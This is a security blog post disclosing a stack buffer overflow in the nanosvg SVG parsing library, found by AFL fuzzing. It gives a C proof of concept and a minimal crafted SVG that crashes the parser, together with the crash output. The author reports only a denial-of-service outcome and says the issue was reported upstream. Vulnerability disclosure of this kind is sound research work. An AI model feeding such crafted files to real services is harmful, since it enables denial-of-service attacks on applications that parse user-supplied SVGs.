<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <title>
    CVE-2019-1000032: Memory corruption / DoS in nanosvg | Sebastian Neef - 0day.work
    </title>

    

    <meta name="HandheldFriendly" content="True" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />

    <link rel="shortcut icon" href="/favicon.png">

    <!--<link rel="stylesheet" type="text/css" href="/assets/css/screen.css?v=e104868e81" />-->

    <link rel="stylesheet" href="/assets/css/bootstrap.min.css?v=e104868e81"/>
    <link rel="stylesheet" href="/assets/css/monokai_sublime.css?v=e104868e81">
    <link rel="stylesheet" href="/assets/css/default.css?v=e104868e81">
    <link rel="stylesheet" href="/assets/css/elusive-icons.min.css?v=e104868e81">
    <link rel="stylesheet" href="/assets/css/cookieconsent.min.css?v=e104868e81">

    <link rel="icon" href="/favicon.png" type="image/png" />
    <link rel="canonical" href="https://0day.work/cve-2019-1000032-memory-corruption-in-nanosvg/" />
    <meta name="referrer" content="no-referrer-when-downgrade" />
    <link rel="amphtml" href="https://0day.work/cve-2019-1000032-memory-corruption-in-nanosvg/amp/" />
    
    <meta property="og:site_name" content="Sebastian Neef - 0day.work" />
    <meta property="og:type" content="article" />
    <meta property="og:title" content="CVE-2019-1000032: Memory corruption / DoS in nanosvg" />
    <meta property="og:description" content="This is finally the first 0day-like blogpost about a memory corruption/DoS issue that I have discovered in nanosvg by fuzzing it with AFL.  UPDATE: After my request for updating the CVE-ID, it was magically assigned CVE-2019-1010258.  Last year, I started to play around with American Fuzzy Lop and began" />
    <meta property="og:url" content="https://0day.work/cve-2019-1000032-memory-corruption-in-nanosvg/" />
    <meta property="article:published_time" content="2019-02-24T17:12:08.000Z" />
    <meta property="article:modified_time" content="2019-12-02T21:17:42.000Z" />
    <meta property="article:tag" content="writeups" />
    <meta property="article:tag" content="cve" />
    
    <meta name="twitter:card" content="summary" />
    <meta name="twitter:title" content="CVE-2019-1000032: Memory corruption / DoS in nanosvg" />
    <meta name="twitter:description" content="This is finally the first 0day-like blogpost about a memory corruption/DoS issue that I have discovered in nanosvg by fuzzing it with AFL.  UPDATE: After my request for updating the CVE-ID, it was magically assigned CVE-2019-1010258.  Last year, I started to play around with American Fuzzy Lop and began" />
    <meta name="twitter:url" content="https://0day.work/cve-2019-1000032-memory-corruption-in-nanosvg/" />
    <meta name="twitter:label1" content="Written by" />
    <meta name="twitter:data1" content="Sebastian Neef" />
    <meta name="twitter:label2" content="Filed under" />
    <meta name="twitter:data2" content="writeups, cve" />
    <meta name="twitter:site" content="@0daywork" />
    
    <script type="application/ld+json">
{
    "@context": "https://schema.org",
    "@type": "Article",
    "publisher": {
        "@type": "Organization",
        "name": "Sebastian Neef - 0day.work",
        "url": "https://0day.work/",
        "logo": {
            "@type": "ImageObject",
            "url": "https://0day.work/content/images/2016/01/0day-1.png",
            "width": 60,
            "height": 60
        }
    },
    "author": {
        "@type": "Person",
        "name": "Sebastian Neef",
        "url": "https://0day.work/author/sebastian/",
        "sameAs": []
    },
    "headline": "CVE-2019-1000032: Memory corruption / DoS in nanosvg",
    "url": "https://0day.work/cve-2019-1000032-memory-corruption-in-nanosvg/",
    "datePublished": "2019-02-24T17:12:08.000Z",
    "dateModified": "2019-12-02T21:17:42.000Z",
    "keywords": "writeups, cve",
    "description": "This is finally the first 0day-like blogpost about a memory corruption/DoS issue\nthat I have discovered in nanosvg [https://github.com/memononen/nanosvg/] by\nfuzzing it with AFL.\n\nUPDATE: After my request for updating the CVE-ID, it was magically assigned \nCVE-2019-1010258.\n\nLast year, I started to play around with American Fuzzy Lop\n[http://lcamtuf.coredump.cx/afl/] and began to fuzz some open source projects\nfrom GitHub. One of those projects was nanosvg\n[https://github.com/memononen/nanosvg/]",
    "mainEntityOfPage": {
        "@type": "WebPage",
        "@id": "https://0day.work/"
    }
}
    </script>

    <meta name="generator" content="Ghost 3.42" />
    <link rel="alternate" type="application/rss+xml" title="Sebastian Neef - 0day.work" href="https://0day.work/rss/" />
    <style>
    .post img {
    	max-width: 50%;
        height: auto;
        display:block;
        margin: 0 auto;
    }
    .description i.read-more::before {
    	content: "read more...";
    }
    
    body {
        font-size: 1.7em;
    }
</style>
<link rel="stylesheet" href="/assets/css/jquery.fancybox.min.css" />

    <script type="text/javascript" src="/assets/js/jquery.js?v=e104868e81"></script>
    <script type="text/javascript" src="/assets/js/cookieconsent.min.js?v=e104868e81"></script>
    <script type="text/javascript" src="/assets/js/cookies.js?v=e104868e81"></script>

    <!--<link rel="stylesheet" href="/assets/css/default.css?v=e104868e81">-->
    
    <script src="/assets/js/highlight.pack.js?v=e104868e81"></script>
  
      <script>hljs.initHighlightingOnLoad();</script>


<script>

</script>
</head>
<body>
<div class="container">
<div class="row">
<div class="col-md-2 hidden-sm hidden-xs">

    <div class="logo">
<a class="blog-logo" href="https://0day.work">
        <img class="blog-logo-image" src="/content/images/2016/01/0day-1.png" alt="Blog Logo"/>
</a>
    </div>


<h5>Sebastian Neef - 0day.work</h5>
<hr>
<ul class="list-unstyled menu">
    <li>
        <a href="https://0day.work/">
         <i class="el el-home"></i> Home 
        </a>
    </li>
    <li>
        <a href="https://0day.work/contact/">
         <i class="el el-envelope"></i> Contact
        </a>
    </li>

    <li>
       <a href="https://twitter.com/0daywork" target="_blank">
            <i class="el el-twitter"></i> @0daywork
       </a>
    </li>

    <li>
        <a href="https://twitter.com/gehaxelt" target="_blank">
            <i class="el el-twitter"></i> @gehaxelt
        </a>
    </li>

    <li>
        <a href="https://it-solutions-neef.de/impressum.html" target="_blank">
            Impressum
        </a>
    </li>

    <li>
        <a href="https://it-solutions-neef.de/datenschutz.html" target="_blank">
           Datenschutz 
        </a>
    </li>


</ul>



</div>
<div class="col-md-10 col-xs-12">
    

<a href="/" class="read-more"><i class="el el-caret-left read-more"></i> home</a>
<hr>





<main  role="main">

    <article class="row post tag-writeups tag-cve no-image">

        <header class="col-xs-12">
        <div class="col-md-10 no-margin no-padding post">
            <h1 class="title">
            CVE-2019-1000032: Memory corruption / DoS in nanosvg

            </h1>
             </div>
<div class="col-md-2">
            </div>

        </header>

        <section class="col-xs-12">
            <!--kg-card-begin: markdown--><p>This is finally the first 0day-like blogpost about a memory corruption/DoS issue that I have discovered in <a href="https://github.com/memononen/nanosvg/">nanosvg</a> by fuzzing it with AFL.</p>
<p><em>UPDATE</em>: After my request for updating the CVE-ID, it was magically assigned <code>CVE-2019-1010258</code>.</p>
<!-- more -->
<p>Last year, I started to play around with <a href="http://lcamtuf.coredump.cx/afl/">American Fuzzy Lop</a> and began to fuzz some open source projects from GitHub. One of those projects was <a href="https://github.com/memononen/nanosvg/">nanosvg</a>, a small library for working with SVG files.</p>
<p>After writing a small fuzz target program, I let AFL fuzz for a couple of days.<br>
<img src="https://0day.work/content/images/2019/02/fuzz.png" alt="Fuzzing overview"><br>
Eventually, AFL managed to find an input that crashes the binary within the nanosvg library.<br>
<img src="https://0day.work/content/images/2019/02/crash.png" alt="Crash PoC"></p>
<p>As I didn't have the time and knowledge to have a deep look into the crash files and analyze them, my colleague <a href="https://twitter.com/b1twave">bitwave (Moritz Lummerzheim)</a>  helped me out. He created a minimal working example to trigger the bug and figured out that one can overflow a buffer using <code>%</code> or <code>\t</code> characters in the <code>nsvg__parseColorRGB</code> color function.</p>
<p>Here is a PoC that will trigger a segfault in the vulnerable function:</p>
<pre><code class="language-plain">#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;float.h&gt;
#define NANOSVG_IMPLEMENTATION
#include &quot;./src/nanosvg.h&quot;

int main(int argc, char const *argv[])
{
	printf(&quot;%d\n&quot;, nsvg__parseColorRGB(&quot;rgb(0%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%)&quot;));
	return 0;
}
</code></pre>
<p>The function can also be triggered by using the library in its intended way, e.g. by passing a SVG file to <code>nsvgParseFromFile</code>:</p>
<pre><code class="language-plain">int main(int argc, char const *argv[])
{
	struct NSVGimage* image;
	image = nsvgParseFromFile(argv[1], &quot;px&quot;, 96);
}
</code></pre>
<p>The following svg is a minimal PoC that will result in a segfault:</p>
<pre><code class="language-plain">&lt;svg&gt;
	&lt;circle fill=&quot;rgb(0%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%)&quot;/&gt;
&lt;/svg&gt;
</code></pre>
<pre><code class="language-plain">$&gt; ./test poc.svg
*** stack smashing detected ***: &lt;unknown&gt; terminated
fish: “./test poc.svg” terminated by signal SIGABRT (Abort)
</code></pre>
<p>We were unable find a way to develop a more serious exploit, we reported the problem to the develop through <a href="https://github.com/memononen/nanosvg/issues/136">issue #136</a>, but it seems like the dev is inactive and/or has not cared to respond.</p>
<p>Anyway, the best we can achieve using the bug is crashing the application with a segfault. A quick search shows that several programming languages have created packages with bindings to the nanosvg library:</p>
<ul>
<li>Lua: <a href="https://github.com/iongion/lunavg">https://github.com/iongion/lunavg</a></li>
<li>Python: <a href="https://github.com/ethanhs/pynanosvg">https://github.com/ethanhs/pynanosvg</a></li>
<li>Java: <a href="https://javalibs.com/artifact/org.lwjgl/lwjgl-nanovg">https://javalibs.com/artifact/org.lwjgl/lwjgl-nanovg</a></li>
<li>Rust: <a href="https://crates.rs/crates/nsvg">https://crates.rs/crates/nsvg</a></li>
</ul>
<p>So depending on the usage of those libraries, passing user-controlled SVG files to nanosvg might allow an attacker to trigger this bug.</p>
<p>If you manage to develop a more serious exploit or exploitation scenario, please let us know and I'll update this blogpost.</p>
<p>-=-</p>
<!--kg-card-end: markdown-->
        </section>

        <footer class="col-xs-12 author">
            
            <hr>

      
        </footer>

    </article>
    
</main>


</div>

</div>
</div>

    <footer class="page-footer">
      <div class="container">
        <div class="row">
          <div class="col-xs-6">
          <i class="el el-stop footer-icon"></i>
            &copy; 2021 <a href="https://0day.work">Sebastian Neef - 0day.work</a> All rights reserved.<br><br>
            Coder Ghost Theme created by <a href="https://www.mbejda.com">Milos Bejda</a>
          </div>
          <div class="col-xs-6 text-right hidden-sm hidden-xs">Proudly published with <a href="https://ghost.org">Ghost</a></div>
        </div>
      </div>
    </footer>

    <a href="#" class="back-to-top"><span class="fa fa-angle-up fa-2x"></span></a>

    <script src="/assets/js/jquery.fancybox.min.js?v=1"></script>
<script src="/assets/js/fancybox.js?v=1"></script>
<!-- Piwik -->
<script type="text/javascript">
  var _paq = _paq || [];
  /* tracker methods like "setCustomDimension" should be called before "trackPageView" */
  _paq.push(["setDocumentTitle", document.domain + "/" + document.title]);
  _paq.push(["setCookieDomain", "*.0day.work"]);
  _paq.push(["setDomains", ["*.0day.work"]]);
  _paq.push(['trackPageView']);
  _paq.push(['enableLinkTracking']);
  (function() {
    var u="//piwik.neef.it/";
    _paq.push(['setTrackerUrl', u+'piwik.php']);
    _paq.push(['setSiteId', '10']);
    var d=document, g=d.createElement('script'), s=d.getElementsByTagName('script')[0];
    g.type='text/javascript'; g.async=true; g.defer=true; g.src=u+'piwik.js'; s.parentNode.insertBefore(g,s);
  })();
</script>
<noscript><p><img src="//piwik.neef.it/piwik.php?idsite=10&rec=1" style="border:0;" alt="" /></p></noscript>
<!-- End Piwik Code -->

    <script src="/assets/js/modernizr.js?v=e104868e81"></script>
    <script type="text/javascript" src="/assets/js/index.js?v=e104868e81"></script>

</body>
</html>
